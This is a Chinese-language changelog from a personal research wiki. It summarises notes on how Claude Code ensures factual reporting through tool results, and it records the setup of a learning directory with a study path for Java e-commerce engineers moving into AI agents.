  - **顶层哲学**：物理隔离替代诚信约束——任何"事实"必须来自 tool_result，模型物理无法伪造（角色约束 + 大输出磁盘溢出 + 工具门控）
  - **双向治理**：仅治过度乐观会推模型转向 hedging；信息密度才是目标；prompts.ts:240 注释 `@[MODEL LAUNCH]` 暗示 prompt 是模型版本的 patch、需要逐版本校准
  - **跨概念关系**：ground-truth-via-tools（事实为真）+ result-delivery-guarantee（事实送达）+ false-claims-bidirectional（事实如实汇报）= Claude Code 完整事实交付链
  - **跟 leto-ai 对偶**：leto-ai 用第二条路径事后 verify、Claude Code 用唯一路径事前隔离——同一问题的两种解法，分别适用于"已部署"和"从头设计"
- 双向链接：read-before-write.md 关联 section 增加上层指向 [[ground-truth-via-tools]]；两篇新页互为兄弟，跟 [[task-notification-injection]] / [[result-delivery-guarantee]] 形成事实交付链簇

## [2026-05-21] init | learning/ 目录建立

- 来源：用户问"Java 电商工程师如何基于本 wiki 入手 AI Agent"，对话产出迁移路线后用户要求归档
- 产出：
  - `learning/README.md`（索引 + 使用约定，**显式声明本目录不需遵循 wiki 主体的研究纪律**——避免跟 OBS/INF/SPEC/NARR checklist 混淆）
  - `learning/01-from-java-to-agent.md`（30 天路径 + 4 步学习法 + 3 个反直觉点 + 待办清单）
- 设计决定：
  - 目录命名 `learning/` 而非 `study-notes/` / `onboarding/`——保留扩展性（不只入门内容）
  - 文件名前缀 `01-` / `02-`——按时间顺序而非主题分类，降低归档心智负担
  - 跟 `concepts/` `insights/` 的边界：那两个是研究产出（受研究纪律约束），`learning/` 是消费侧记录（允许个人化、强主观）
  - index.md 为 learning/ 加独立分区，加 disclaimer 区分跟 wiki 主体的角色
- 内容核心观点：
  - **不要从这个 wiki 开始学 Agent**——wiki 是研究副产品不是入门教程；先用 Anthropic Cookbook 跑 demo，再回来批判性读 wiki
  - **80% 复用电商技能**（降级/熔断/幂等/异步/状态机/缓存淘汰），只补 10% LLM 特有概念（幻觉、prompt 非确定性、token 经济、消息历史角色隔离）
  - **反向应用比顺向学习收获大 3 倍**："Claude Code 这样做，我电商代码是怎么做的"——用 wiki 校准自己的电商实践
  - **可信度排序提示**：直接读"反 pattern 速查表"实战价值最高，"3 条贯穿线"等抽象层最低
- 跟 [[3.SELF_CRITIQUE]] 的关系：本笔记是 SELF_CRITIQUE 显化的可信度结构在**消费侧**的具体应用——告诉读者哪些章可抄、哪些带怀疑读、哪些跳过
